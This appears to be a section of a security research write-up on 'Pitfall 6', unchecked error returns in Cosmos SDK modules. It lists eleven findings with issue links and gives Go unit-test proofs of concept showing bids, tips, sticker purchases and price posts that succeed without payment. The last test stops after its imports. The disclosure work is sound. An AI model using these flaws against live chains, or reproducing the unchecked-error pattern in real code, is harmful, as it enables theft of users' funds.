# Pitfall 6

## Findings Summary

> See the [Per-Finding Index](../../README.md#per-finding-index) for the complete findings table with PoC types, fix status, and similarity values.

| # | Project | PoC Type | Issue Reference |
|---|---------|----------|-----------------|
| 51 | [Jackal](https://github.com/JackalLabs/canine-chain) | UnitTest | [canine-chain#8](https://github.com/JackalLabs/canine-chain/issues/8) |
| 52 | [Ignite](https://github.com/ignite/cli/blob/main/docs/versioned_docs/version-v0.26/02-guide) | UnitTest | [cli#2828](https://github.com/ignite/cli/issues/2828) |
| 53 | [Side Protocol](https://github.com/sideprotocol/ibcswap) | UnitTest | [ibcswap#8](https://github.com/sideprotocol/ibcswap/issues/8) |
| 54 | [OLLO](https://github.com/OllO-Station/ollo) | UnitTest | [ollo#20](https://github.com/OllO-Station/ollo/issues/20) |
| 55 | [Ununifi](https://github.com/exoralayer/chain) | UnitTest | [chain#612](https://github.com/exoralayer/chain/issues/612) |
| 56 | [Stateset](https://github.com/stateset/core) | UnitTest | [core#1](https://github.com/stateset/core/issues/1) |
| 57 | [Haven](https://github.com/onomyprotocol/haven) | UnitTest | [haven#9](https://github.com/onomyprotocol/haven/issues/9) |
| 58 | [ICPlaza](https://github.com/ICPLAZA-org/icplaza) | UnitTest | [icplaza#1](https://github.com/ICPLAZA-org/icplaza/issues/1) |
| 59 | [hero](https://github.com/strangelove-ventures/hero) | UnitTest | [msg_server_burn.go#L41](https://github.com/strangelove-ventures/hero/blob/d6737b82c5ff4976f9a9a57d75a73d61f84bf395/x/tokenfactory/keeper/msg_server_burn.go#L41) |
| 60 | [decoGit](https://github.com/ritajeong/decoGit) | UnitTest | [msg_server_buy_sticker.go#L39](https://github.com/ritajeong/decoGit/blob/9cc1398419dfd0dc26577a7709bcbbf919c1d0d2/server/chain/x/decogit/keeper/msg_server_buy_sticker.go#L39) |
| 61 | [HalbornSecurity](https://github.com/HalbornSecurity/CTFs) | UnitTest | [msg_server_mint_hal.go#L55](https://github.com/HalbornSecurity/CTFs/blob/684f1af02132d4cfa4c6ac04924d8c8391a6e9cf/HalbornCTF_Golang_Cosmos/x/hal/keeper/msg_server_mint_hal.go#L55) |

---

<details>
<summary><b>Key Word Match</b></summary>

`/[[:space:]][[:space:]][a-zA-Z1-9]*\.[a-zA-Z1-9]*\.API/ AND cosmos language:Go`

While the return of error checks exists in many official cosmos modules, some of them are difficult to trigger. We checked the more easily triggered error-related Exported Methods for example [`Bank.Sendxx`](https://github.com/cosmos/cosmos-sdk/blob/c69f963352fe0ee5b690cdfd354a6a395b18cb5d/x/bank/keeper/send.go#L31), [`Nft.XXclass`](https://github.com/cosmos/cosmos-sdk/blob/c69f963352fe0ee5b690cdfd354a6a395b18cb5d/contrib/x/nft/keeper/class.go#L14-L24) and [`DistributionKeeper.FundCommunityPool`](https://github.com/cosmos/cosmos-sdk/blob/c69f963352fe0ee5b690cdfd354a6a395b18cb5d/x/gov/types/expected_keepers.go#L36).

</details>

## PoC
### PoC #51, #52: Jackal & Ignite
canine-chain/x/rns/keeper/msg_server_bid_test.go
```go
package keeper_test

import (
	"testing"

	"github.com/cosmos/cosmos-sdk/codec"
	codectypes "github.com/cosmos/cosmos-sdk/codec/types"
	"github.com/cosmos/cosmos-sdk/crypto/keys/ed25519"
	"github.com/cosmos/cosmos-sdk/store"
	storetypes "github.com/cosmos/cosmos-sdk/store/types"
	sdk "github.com/cosmos/cosmos-sdk/types"
	authkeeper "github.com/cosmos/cosmos-sdk/x/auth/keeper"
	authtypes "github.com/cosmos/cosmos-sdk/x/auth/types"
	bankkeeper "github.com/cosmos/cosmos-sdk/x/bank/keeper"
	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
	typesparams "github.com/cosmos/cosmos-sdk/x/params/types"
	"github.com/jackal-dao/canine/x/rns/keeper"
	"github.com/jackal-dao/canine/x/rns/types"
	"github.com/stretchr/testify/suite"
	"github.com/tendermint/tendermint/libs/log"
	tmproto "github.com/tendermint/tendermint/proto/tendermint/types"
	tmdb "github.com/tendermint/tm-db"
)

type KeeperTestSuite struct {
	suite.Suite

	ctx           sdk.Context
	rnsKeeper     *keeper.Keeper
	bankKeeper    bankkeeper.Keeper
	accountKeeper authkeeper.AccountKeeper
	msgServer     types.MsgServer
	accAddrs []sdk.AccAddress
	accs     []authtypes.AccountI
}

func (suite *KeeperTestSuite) SetupTest() {
	storeKey := sdk.NewKVStoreKey(types.StoreKey)
	memStoreKey := storetypes.NewMemoryStoreKey(types.MemStoreKey)
	authStoreKey := sdk.NewKVStoreKey(authtypes.StoreKey)
	bankStoreKey := sdk.NewKVStoreKey(banktypes.StoreKey)
	db := tmdb.NewMemDB()
	stateStore := store.NewCommitMultiStore(db)
	stateStore.MountStoreWithDB(storeKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(memStoreKey, sdk.StoreTypeMemory, nil)
	stateStore.MountStoreWithDB(authStoreKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(bankStoreKey, sdk.StoreTypeIAVL, db)
	suite.Require().NoError(stateStore.LoadLatestVersion())
	registry := codectypes.NewInterfaceRegistry()
	authtypes.RegisterInterfaces(registry)
	banktypes.RegisterInterfaces(registry)
	cdc := codec.NewProtoCodec(registry)
	paramsSubspace := typesparams.NewSubspace(
		cdc,
		types.Amino,
		storeKey,
		memStoreKey,
		"RnsParams",
	)
	bankParamsSubspace := typesparams.NewSubspace(
		cdc,
		codec.NewLegacyAmino(),
		bankStoreKey,
		memStoreKey,
		"BankParams",
	)
	maccPerms := map[string][]string{
		authtypes.FeeCollectorName: nil,
		types.ModuleName:           {authtypes.Burner, authtypes.Minter},
	}
	suite.accountKeeper = authkeeper.NewAccountKeeper(
		cdc,
		authStoreKey,
		paramsSubspace,
		authtypes.ProtoBaseAccount,
		maccPerms,
	)
	blockedAddrs := make(map[string]bool)
	for acc := range maccPerms {
		blockedAddrs[authtypes.NewModuleAddress(acc).String()] = true
	}

	suite.bankKeeper = bankkeeper.NewBaseKeeper(
		cdc,
		bankStoreKey,
		suite.accountKeeper,
		bankParamsSubspace,
		blockedAddrs,
	)
	suite.rnsKeeper = keeper.NewKeeper(
		cdc,
		storeKey,
		memStoreKey,
		paramsSubspace,
		suite.bankKeeper,
	)

	suite.ctx = sdk.NewContext(stateStore, tmproto.Header{}, false, log.NewNopLogger())
	suite.rnsKeeper.SetParams(suite.ctx, types.DefaultParams())
	suite.bankKeeper.SetParams(suite.ctx, banktypes.DefaultParams())
	suite.msgServer = keeper.NewMsgServerImpl(*suite.rnsKeeper)
	suite.accAddrs = make([]sdk.AccAddress, 1)
	suite.accs = make([]authtypes.AccountI, 1)
	for i := 0; i < 1; i++ {
		priv := ed25519.GenPrivKey()
		suite.accAddrs[i] = sdk.AccAddress(priv.PubKey().Address())
		suite.accs[i] = suite.accountKeeper.NewAccountWithAddress(suite.ctx, suite.accAddrs[i])
		suite.accountKeeper.SetAccount(suite.ctx, suite.accs[i])
	}
}

func (suite *KeeperTestSuite) fundAccount(addr sdk.AccAddress, coins sdk.Coins) {
	acc := suite.accountKeeper.GetAccount(suite.ctx, addr)
	if acc == nil {
		acc = suite.accountKeeper.NewAccountWithAddress(suite.ctx, addr)
		suite.accountKeeper.SetAccount(suite.ctx, acc)
	}
	err := suite.bankKeeper.MintCoins(suite.ctx, types.ModuleName, coins)
	suite.Require().NoError(err)
	err = suite.bankKeeper.SendCoinsFromModuleToAccount(suite.ctx, types.ModuleName, addr, coins)
	suite.Require().NoError(err)
}
func TestKeeperTestSuite(t *testing.T) {
	suite.Run(t, new(KeeperTestSuite))
}

func (suite *KeeperTestSuite) TestMsgBid() {
	creator := suite.accAddrs[0]
	name := "jackal"
	bid := "100"
	suite.fundAccount(creator, sdk.NewCoins(sdk.NewInt64Coin("ujkl", 0)))

	resp, err := suite.msgServer.Bid(sdk.WrapSDKContext(suite.ctx), &types.MsgBid{
		Creator: creator.String(),
		Name:    name,
		Bid:     bid,
	})

	suite.Require().NoError(err)
	suite.Require().NotNil(resp)
	stored, found := suite.rnsKeeper.GetBids(suite.ctx, creator.String()+name)
	suite.Require().True(found)
	suite.Require().Equal(name, stored.Name)
	suite.Require().Equal(bid, stored.Price)
	suite.Require().Equal(creator.String(), stored.Bidder)
}

```

### PoC #54: OLLO
ollo/x/loan/keeper/msg_test.go
```
package keeper_test

import (
	"testing"

	keepertest "ollo/testutil/keeper"
	"ollo/x/loan/keeper"
	"ollo/x/loan/types"

	sdk "github.com/cosmos/cosmos-sdk/types"
	"github.com/stretchr/testify/require"
)

func TestMsgServerApproveLoan(t *testing.T) {
	k, sdkCtx := keepertest.LoanKeeper(t)
	msgServer := keeper.NewMsgServerImpl(*k)
	ctx := sdk.WrapSDKContext(sdkCtx)
	creator := "cosmos1abc"
	borrower := "cosmos1def"
	loan := types.Loans{
		Id:         0,
		Amount:     "1000stake",
		Fee:        "100stake",
		Collateral: "2000stake",
		Deadline:   "2024-12-31",
		State:      "requested",
		Borrower:   borrower,
		Lender:     "",
	}

	k.AppendLoans(sdkCtx, loan)

	msg := types.NewMsgApproveLoan(creator, 0)
	response, err := msgServer.ApproveLoan(ctx, msg)

	require.NoError(t, err)
	require.NotNil(t, response)

	updatedLoan, found := k.GetLoans(sdkCtx, 0)
	require.True(t, found)
	require.Equal(t, "approved", updatedLoan.State)
	require.Equal(t, creator, updatedLoan.Lender)
	require.Equal(t, uint64(0), updatedLoan.Id)
}
```

### PoC #53: Side Protocol
ibcswap/modules/apps/101-interchain-swap/keeper/msg_server_deposit_test.go
```
package keeper_test

import (
	"fmt"

	sdk "github.com/cosmos/cosmos-sdk/types"
	"github.com/sideprotocol/ibcswap/v4/modules/apps/101-interchain-swap/keeper"
	"github.com/sideprotocol/ibcswap/v4/modules/apps/101-interchain-swap/types"
)

func (suite *KeeperTestSuite) SetupPool() (*string, error) {
	suite.SetupTest()
	path := NewInterchainSwapPath(suite.chainA, suite.chainB)
	suite.coordinator.Setup(path)
	msg := types.NewMsgCreatePool(
		path.EndpointA.ChannelConfig.PortID,
		path.EndpointA.ChannelID,
		suite.chainA.SenderAccount.GetAddress().String(),
		"1:2",
		[]string{sdk.DefaultBondDenom, "venuscoin"},
		[]uint32{10, 100},
	)

	ctx := suite.chainA.GetContext()
	suite.chainA.GetSimApp().IBCInterchainSwapKeeper.OnCreatePoolAcknowledged(ctx, msg)
	poolId := types.GetPoolId(msg.Denoms)
	return &poolId, nil
}

func (suite *KeeperTestSuite) TestMsgDeposit() {
	var msg *types.MsgDepositRequest
	testCases := []struct {
		name     string
		malleate func()
		expPass  bool
	}{
		{
			"success",
			func() {},
			true,
		},
	}
	for _, tc := range testCases {
		// create pool first of all.
		pooId, err := suite.SetupPool()
		suite.Require().NoError(err)
		fmt.Println(pooId)
		msg = types.NewMsgDeposit(
			*pooId,
			sdk.AccAddress([]byte("test-address-1")).String(),
			[]*sdk.Coin{{Denom: sdk.DefaultBondDenom, Amount: sdk.NewInt(100)}},
		)
		balance := suite.chainA.GetSimApp().BankKeeper.GetBalance(suite.chainA.GetContext(), sdk.AccAddress([]byte("test-address-1")), sdk.DefaultBondDenom)
		suite.chainA.GetSimApp().BankKeeper.SendCoins(suite.chainA.GetContext(), suite.chainA.SenderAccount.GetAddress(), sdk.AccAddress([]byte("test-address-1")), sdk.NewCoins(sdk.NewCoin(sdk.DefaultBondDenom, sdk.NewInt(10))))
		suite.Require().True(balance.Amount.LT(sdk.NewInt(100)))
		tc.malleate()
		msgSrv := keeper.NewMsgServerImpl(suite.chainA.GetSimApp().IBCInterchainSwapKeeper)
		res, err := msgSrv.Deposit(sdk.WrapSDKContext(suite.chainA.GetContext()), msg)
		suite.Require().NoError(err)
		suite.Require().NotNil(res)
	}
}
```

### PoC #58: ICPlaza
icplaza/x/auction/keeper/msg_server_test.go
```
package keeper_test

import (
	"testing"
	"time"

	"github.com/cosmos/cosmos-sdk/codec"
	codectypes "github.com/cosmos/cosmos-sdk/codec/types"
	"github.com/cosmos/cosmos-sdk/crypto/keys/ed25519"
	"github.com/cosmos/cosmos-sdk/store"
	storetypes "github.com/cosmos/cosmos-sdk/store/types"
	sdk "github.com/cosmos/cosmos-sdk/types"
	bankkeeper "github.com/cosmos/cosmos-sdk/x/bank/keeper"
	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
	paramskeeper "github.com/cosmos/cosmos-sdk/x/params/keeper"
	"github.com/gauss/gauss/v6/x/auction/keeper"
	"github.com/gauss/gauss/v6/x/auction/types"
	auctionTypes "github.com/gauss/gauss/v6/x/auction/types"

	authkeeper "github.com/cosmos/cosmos-sdk/x/auth/keeper"
	authtypes "github.com/cosmos/cosmos-sdk/x/auth/types"
	paramstypes "github.com/cosmos/cosmos-sdk/x/params/types"
	"github.com/stretchr/testify/require"
	"github.com/tendermint/tendermint/libs/log"
	tmproto "github.com/tendermint/tendermint/proto/tendermint/types"
	dbm "github.com/tendermint/tm-db"
)

func AuctionKeeper(t testing.TB) (*keeper.Keeper, sdk.Context) {
	storeKey := sdk.NewKVStoreKey(types.StoreKey)
	memStoreKey := storetypes.NewMemoryStoreKey(types.MemStoreKey)
	bankStoreKey := sdk.NewKVStoreKey(banktypes.StoreKey)
	authStoreKey := sdk.NewKVStoreKey(authtypes.StoreKey)
	paramsStoreKey := sdk.NewKVStoreKey(paramstypes.StoreKey)
	paramsTStoreKey := storetypes.NewTransientStoreKey(paramstypes.TStoreKey)

	db := dbm.NewMemDB()
	stateStore := store.NewCommitMultiStore(db)

	stateStore.MountStoreWithDB(storeKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(memStoreKey, sdk.StoreTypeMemory, nil)
	stateStore.MountStoreWithDB(bankStoreKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(authStoreKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(paramsStoreKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(paramsTStoreKey, sdk.StoreTypeTransient, db)

	require.NoError(t, stateStore.LoadLatestVersion())

	registry := codectypes.NewInterfaceRegistry()
	cdc := codec.NewProtoCodec(registry)

	maccPerms := map[string][]string{
		authtypes.FeeCollectorName: nil,
		types.ModuleName:           {authtypes.Minter, authtypes.Burner, authtypes.Staking},
	}

	paramsKeeper := paramskeeper.NewKeeper(cdc, codec.NewLegacyAmino(), paramsStoreKey, paramsTStoreKey)

	accountKeeper := authkeeper.NewAccountKeeper(
		cdc,
		authStoreKey,
		paramsKeeper.Subspace(authtypes.ModuleName),
		authtypes.ProtoBaseAccount,
		maccPerms,
	)

	bankKeeper := bankkeeper.NewBaseKeeper(
		cdc,
		bankStoreKey,
		accountKeeper,
		paramsKeeper.Subspace(banktypes.ModuleName),
		make(map[string]bool),
	)

	k := keeper.NewKeeper(
		cdc,
		storeKey,
		memStoreKey,
		paramsKeeper.Subspace(auctionTypes.ModuleName),
		nil,
		nil,
		bankKeeper,
	)

	ctx := sdk.NewContext(stateStore, tmproto.Header{}, false, log.NewNopLogger())

	return &k, ctx
}

func TestMsgServer_BidOrder_Success(t *testing.T) {


	auctionKeeper, sdkCtx := AuctionKeeper(t)

	msgServer := keeper.NewMsgServerImpl(*auctionKeeper)

	sender := sdk.AccAddress(ed25519.GenPrivKey().PubKey().Address().Bytes())
	tokenId := "test-token-1"
	poolAddress := sdk.AccAddress(ed25519.GenPrivKey().PubKey().Address().Bytes())
	startPrice := sdk.NewCoin("ugauss", sdk.NewInt(1000000))
	minStep := sdk.NewCoin("ugauss", sdk.NewInt(100000))
	startTime := time.Now().Add(-time.Hour)
	endTime := time.Now().Add(24 * time.Hour)
	autoAgreePeriod := time.Hour


	testOrder := auctionTypes.Order{
		TokenId:         tokenId,
		Price:           &startPrice,
		BidPrice:        sdk.NewCoin("ugauss", sdk.NewInt(0)),
		Bidder:          "",
		StartTime:       startTime,
		EndTime:         endTime,
		MinEndTime:      time.Time{},
		MinStep:         minStep,
		PoolAddress:     poolAddress.String(),
		AutoAgreePeriod: autoAgreePeriod,
	}

	msgServerImpl := msgServer.(*keeper.msgServer)
	err := msgServerImpl.saveOrder(sdkCtx, testOrder)
	require.NoError(t, err)

	bidPrice := sdk.NewCoin("ugauss", sdk.NewInt(1200000))
	msg := auctionTypes.NewMsgBidOrder(
		sender.String(),
		tokenId,
		bidPrice,
		poolAddress.String(),
	)


	err = msg.ValidateBasic()
	require.NoError(t, err)


	ctx := sdk.WrapSDKContext(sdkCtx)
	response, err := msgServer.BidOrder(ctx, msg)
	require.NoError(t, err)
	require.NotNil(t, response)

}

```

### PoC #57: Haven
haven/x/haven/keeper/msg_server_tip_post_test.go
```
package keeper_test

import (
	"strconv"
	"testing"

	sdk "github.com/cosmos/cosmos-sdk/types"
	keepertest "github.com/onomyprotocol/haven/testutil/keeper"
	"github.com/onomyprotocol/haven/testutil/sample"
	"github.com/onomyprotocol/haven/x/haven/keeper"
	"github.com/onomyprotocol/haven/x/haven/types"
	"github.com/stretchr/testify/require"
)

// Prevent strconv unused error
var _ = strconv.IntSize

func TestMsgTipPost(t *testing.T) {
	k, sdkCtx := keepertest.HavenKeeper(t)
	ctx := sdk.WrapSDKContext(sdkCtx)
	msgServer := keeper.NewMsgServerImpl(*k)

	
	haven := types.Haven{
		Uid:      1,
		Name:     "test-haven",
		Owner:    sample.AccAddress(),
		Rake:     10,
		Earnings: sdk.NewCoin("kudos", sdk.NewInt(100)),
	}
	k.SetHaven(sdkCtx, haven)

	
	post := types.Post{
		Uid:   1,
		Title: "Test Post",
		Body:  "Test Body",
		Owner: sample.AccAddress(),
		Haven: haven.Uid,
		Tips:  sdk.NewCoin("kudos", sdk.NewInt(100)),
	}
	k.SetPost(sdkCtx, post)

	
	msg := &types.MsgTipPost{
		Creator: sample.AccAddress(),
		Uid:     strconv.FormatUint(post.Uid, 10),
		Amount:  "100",
	}

	
	response, err := msgServer.TipPost(ctx, msg)
	require.NoError(t, err)
	require.NotNil(t, response)

	
	updatedPost, found := k.GetPost(sdkCtx, post.Uid)
	require.True(t, found)
	expectedTips := sdk.NewCoin("kudos", sdk.NewInt(100))
	require.Equal(t, expectedTips, updatedPost.Tips)

	
	_, found = k.GetHaven(sdkCtx, haven.Uid)
	require.True(t, found)

}
```

### PoC #56: Stateset
core/x/loan/keeper/loan_test.go
```
package keeper_test

import (
	"testing"

	sdk "github.com/cosmos/cosmos-sdk/types"
	keepertest "github.com/stateset/core/testutil/keeper"
	"github.com/stateset/core/x/loan/keeper"
	"github.com/stateset/core/x/loan/types"
	"github.com/stretchr/testify/require"
)

func createNLoan(keeper *keeper.Keeper, ctx sdk.Context, n int) []types.Loan {
	items := make([]types.Loan, n)
	for i := range items {
		items[i].Id = keeper.AppendLoan(ctx, items[i])
	}
	return items
}

func TestLoanGet(t *testing.T) {
	keeper, ctx := keepertest.LoanKeeper(t)
	items := createNLoan(keeper, ctx, 10)
	for _, item := range items {
		got, found := keeper.GetLoan(ctx, item.Id)
		require.True(t, found)
		require.Equal(t, item, got)
	}
}

func TestLoanRemove(t *testing.T) {
	keeper, ctx := keepertest.LoanKeeper(t)
	items := createNLoan(keeper, ctx, 10)
	for _, item := range items {
		keeper.RemoveLoan(ctx, item.Id)
		_, found := keeper.GetLoan(ctx, item.Id)
		require.False(t, found)
	}
}

func TestLoanGetAll(t *testing.T) {
	keeper, ctx := keepertest.LoanKeeper(t)
	items := createNLoan(keeper, ctx, 10)
	require.ElementsMatch(t, items, keeper.GetAllLoan(ctx))
}

func TestLoanCount(t *testing.T) {
	keeper, ctx := keepertest.LoanKeeper(t)
	items := createNLoan(keeper, ctx, 10)
	count := uint64(len(items))
	require.Equal(t, count, keeper.GetLoanCount(ctx))
}

func TestApproveLoan(t *testing.T) {
	loanKeeper, ctx := keepertest.LoanKeeper(t)

	creator := sdk.AccAddress([]byte("creator"))
	borrower := sdk.AccAddress([]byte("borrower"))

	loan := types.Loan{
		Id:         1,
		Amount:     "100stake",
		Fee:        "10stake",
		Collateral: "200stake",
		Deadline:   "2024-12-31",
		State:      "requested",
		Borrower:   borrower.String(),
		Lender:     "",
	}
	loanKeeper.SetLoan(ctx, loan)
	msg := types.NewMsgApproveLoan(creator.String(), 1)
	msgServer := keeper.NewMsgServerImpl(*loanKeeper)
	goCtx := sdk.WrapSDKContext(ctx)
	response, err := msgServer.ApproveLoan(goCtx, msg)
	require.NoError(t, err)
	require.NotNil(t, response)
	updatedLoan, found := loanKeeper.GetLoan(ctx, 1)
	require.True(t, found)
	require.Equal(t, "approved", updatedLoan.State)
	require.Equal(t, creator.String(), updatedLoan.Lender)
}

```

### PoC #55: Ununifi
chain/x/pricefeed/keeper/msg_serve_test.go
```golang
package keeper_test

import (
	"testing"
	"time"

	dbm "github.com/cometbft/cometbft-db"
	tmproto "github.com/cometbft/cometbft/proto/tendermint/types"
	tmtime "github.com/cometbft/cometbft/types/time"
	"github.com/cosmos/cosmos-sdk/store"
	storetypes "github.com/cosmos/cosmos-sdk/store/types"
	sdk "github.com/cosmos/cosmos-sdk/types"
	paramstypes "github.com/cosmos/cosmos-sdk/x/params/types"
	"github.com/stretchr/testify/require"

	"github.com/UnUniFi/chain/app"
	pricefeedkeeper "github.com/UnUniFi/chain/x/pricefeed/keeper"
	pricefeedtypes "github.com/UnUniFi/chain/x/pricefeed/types"
)

func setupMsgServerTest(t *testing.T) (pricefeedtypes.MsgServer, sdk.Context, pricefeedkeeper.Keeper, []string) {
	_, addrs := app.GeneratePrivKeyAddressPairs(3)
	strAddrs := make([]string, len(addrs))
	for i, addr := range addrs {
		strAddrs[i] = addr.String()
	}

	// Create test app for bank keeper and codec
	tApp := app.NewTestApp()

	// Create custom stores for pricefeed
	db := dbm.NewMemDB()
	cms := store.NewCommitMultiStore(db)

	// Create store keys
	storeKey := storetypes.NewKVStoreKey(pricefeedtypes.StoreKey)
	memStoreKey := storetypes.NewMemoryStoreKey(pricefeedtypes.MemStoreKey)
	paramsStoreKey := storetypes.NewKVStoreKey(paramstypes.StoreKey)
	tParamsStoreKey := storetypes.NewTransientStoreKey(paramstypes.TStoreKey)

	// Mount stores
	cms.MountStoreWithDB(storeKey, storetypes.StoreTypeIAVL, db)
	cms.MountStoreWithDB(memStoreKey, storetypes.StoreTypeMemory, nil)
	cms.MountStoreWithDB(paramsStoreKey, storetypes.StoreTypeIAVL, db)
	cms.MountStoreWithDB(tParamsStoreKey, storetypes.StoreTypeTransient, nil)
	cms.LoadLatestVersion()

	// Create context with custom stores
	ctx := sdk.NewContext(cms, tmproto.Header{}, true, nil)

	// Create params subspace manually for testing
	pricefeedSubspace := paramstypes.NewSubspace(
		tApp.AppCodec(),
		tApp.LegacyAmino(),
		paramsStoreKey,
		tParamsStoreKey,
		pricefeedtypes.ModuleName,
	).WithKeyTable(pricefeedtypes.ParamKeyTable())

	// Create a new keeper with the proper subspace and custom stores
	keeper := pricefeedkeeper.NewKeeper(
		tApp.AppCodec(),
		storeKey,
		memStoreKey,
		pricefeedSubspace,
		tApp.GetBankKeeper(),
	)

	// Setup basic params with test markets and oracles
	params := pricefeedtypes.Params{
		DepositForPosting: sdk.NewCoin("uguu", sdk.NewInt(1000)),
		Markets: pricefeedtypes.Markets{
			{
				MarketId:   "btc:usd",
				BaseAsset:  "btc",
				QuoteAsset: "usd",
				Oracles:    strAddrs,
				Active:     true,
			},
			{
				MarketId:   "eth:usd",
				BaseAsset:  "eth",
				QuoteAsset: "usd",
				Oracles:    strAddrs,
				Active:     true,
			},
		},
	}
	keeper.SetParams(ctx, params)

	msgServer := pricefeedkeeper.NewMsgServerImpl(keeper)
	return msgServer, ctx, keeper, strAddrs
}

func TestMsgServer_PostPrice_Success(t *testing.T) {
	msgServer, ctx, keeper, oracles := setupMsgServerTest(t)

	// Test successful price posting
	msg := &pricefeedtypes.MsgPostPrice{
		From:     oracles[0],//don't have any coins!
		MarketId: "btc:usd",
		Price:    sdk.MustNewDecFromStr("45000.50"),
		Expiry:   tmtime.Now().Add(1 * time.Hour),
		Deposit:  sdk.NewCoin("uguu", sdk.NewInt(2000)),
	}

	resp, err := msgServer.PostPrice(sdk.WrapSDKContext(ctx), msg)
	require.NoError(t, err)
	require.NotNil(t, resp)

	// Verify price was set correctly
	rawPrices, err := keeper.GetRawPrices(ctx, "btc:usd")
	require.NoError(t, err)
	require.Len(t, rawPrices, 1)
	require.Equal(t, oracles[0], rawPrices[0].OracleAddress)
	require.True(t, rawPrices[0].Price.Equal(sdk.MustNewDecFromStr("45000.50")))
}
```

### PoC #60: decoGit
server/chain/x/decogit/keeper/msg_server_buy_sticker_test.go
```golang
package keeper_test

import (
	"testing"

	"decogit/x/decogit/keeper"
	"decogit/x/decogit/types"

	"github.com/cosmos/cosmos-sdk/codec"
	codectypes "github.com/cosmos/cosmos-sdk/codec/types"
	"github.com/cosmos/cosmos-sdk/crypto/keys/ed25519"
	"github.com/cosmos/cosmos-sdk/store"
	storetypes "github.com/cosmos/cosmos-sdk/store/types"
	sdk "github.com/cosmos/cosmos-sdk/types"
	authkeeper "github.com/cosmos/cosmos-sdk/x/auth/keeper"
	authtypes "github.com/cosmos/cosmos-sdk/x/auth/types"
	bankkeeper "github.com/cosmos/cosmos-sdk/x/bank/keeper"
	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
	paramskeeper "github.com/cosmos/cosmos-sdk/x/params/keeper"
	paramstypes "github.com/cosmos/cosmos-sdk/x/params/types"
	"github.com/stretchr/testify/require"
	"github.com/tendermint/tendermint/libs/log"
	tmproto "github.com/tendermint/tendermint/proto/tendermint/types"
	dbm "github.com/tendermint/tm-db"
)

func setupKeeperWithBank(t testing.TB) (*keeper.Keeper, bankkeeper.BaseKeeper, sdk.Context) {
	storeKey := sdk.NewKVStoreKey(types.StoreKey)
	memStoreKey := storetypes.NewMemoryStoreKey(types.MemStoreKey)
	bankStoreKey := sdk.NewKVStoreKey(banktypes.StoreKey)
	authStoreKey := sdk.NewKVStoreKey(authtypes.StoreKey)
	paramsStoreKey := sdk.NewKVStoreKey(paramstypes.StoreKey)
	paramsTStoreKey := storetypes.NewTransientStoreKey(paramstypes.TStoreKey)

	db := dbm.NewMemDB()
	stateStore := store.NewCommitMultiStore(db)
	stateStore.MountStoreWithDB(storeKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(memStoreKey, sdk.StoreTypeMemory, nil)
	stateStore.MountStoreWithDB(bankStoreKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(authStoreKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(paramsStoreKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(paramsTStoreKey, sdk.StoreTypeTransient, db)
	require.NoError(t, stateStore.LoadLatestVersion())

	registry := codectypes.NewInterfaceRegistry()
	authtypes.RegisterInterfaces(registry)
	cdc := codec.NewProtoCodec(registry)

	maccPerms := map[string][]string{types.ModuleName: {authtypes.Minter}}

	paramsKeeper := paramskeeper.NewKeeper(cdc, codec.NewLegacyAmino(), paramsStoreKey, paramsTStoreKey)
	accountKeeper := authkeeper.NewAccountKeeper(cdc, authStoreKey, paramsKeeper.Subspace(authtypes.ModuleName), authtypes.ProtoBaseAccount, maccPerms)
	bankKeeper := bankkeeper.NewBaseKeeper(cdc, bankStoreKey, accountKeeper, paramsKeeper.Subspace(banktypes.ModuleName), make(map[string]bool))

	k := keeper.NewKeeper(cdc, storeKey, memStoreKey, paramsKeeper.Subspace(types.ModuleName), bankKeeper)

	ctx := sdk.NewContext(stateStore, tmproto.Header{}, false, log.NewNopLogger())
	k.SetParams(ctx, types.DefaultParams())

	return k, bankKeeper, ctx
}

func TestBuyStickerWithoutPaying(t *testing.T) {
	k, bankKeeper, ctx := setupKeeperWithBank(t)
	msgServer := keeper.NewMsgServerImpl(*k)

	owner := sdk.AccAddress(ed25519.GenPrivKey().PubKey().Address().Bytes())
	buyer := sdk.AccAddress(ed25519.GenPrivKey().PubKey().Address().Bytes())

	funds := sdk.NewCoins(sdk.NewCoin("DECO", sdk.NewInt(5)))
	require.NoError(t, bankKeeper.MintCoins(ctx, types.ModuleName, funds))
	require.NoError(t, bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, buyer, funds))

	k.SetSticker(ctx, types.Sticker{
		Index: "sticker-1",
		Name:  "rare-sticker",
		Price: "10DECO",
		Owner: owner.String(),
	})

	resp, err := msgServer.BuySticker(sdk.WrapSDKContext(ctx), &types.MsgBuySticker{
		Creator:   buyer.String(),
		StickerId: "sticker-1",
		Bid:       "10DECO",
	})
	require.NoError(t, err)
	require.NotNil(t, resp)

	require.Equal(t, sdk.NewInt(5), bankKeeper.GetBalance(ctx, buyer, "DECO").Amount)
	require.True(t, bankKeeper.GetBalance(ctx, owner, "DECO").IsZero())

	owned := false
	for _, s := range k.GetAllSticker(ctx) {
		if s.Owner == buyer.String() {
			owned = true
		}
	}
	require.True(t, owned)
}
```

### PoC #59: hero
x/tokenfactory/keeper/msg_server_burn_poc_test.go
```golang
package keeper_test

import (
	"testing"

	"github.com/cosmos/cosmos-sdk/codec"
	codectypes "github.com/cosmos/cosmos-sdk/codec/types"
	"github.com/cosmos/cosmos-sdk/crypto/keys/ed25519"
	"github.com/cosmos/cosmos-sdk/store"
	storetypes "github.com/cosmos/cosmos-sdk/store/types"
	sdk "github.com/cosmos/cosmos-sdk/types"
	authkeeper "github.com/cosmos/cosmos-sdk/x/auth/keeper"
	authtypes "github.com/cosmos/cosmos-sdk/x/auth/types"
	bankkeeper "github.com/cosmos/cosmos-sdk/x/bank/keeper"
	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
	paramskeeper "github.com/cosmos/cosmos-sdk/x/params/keeper"
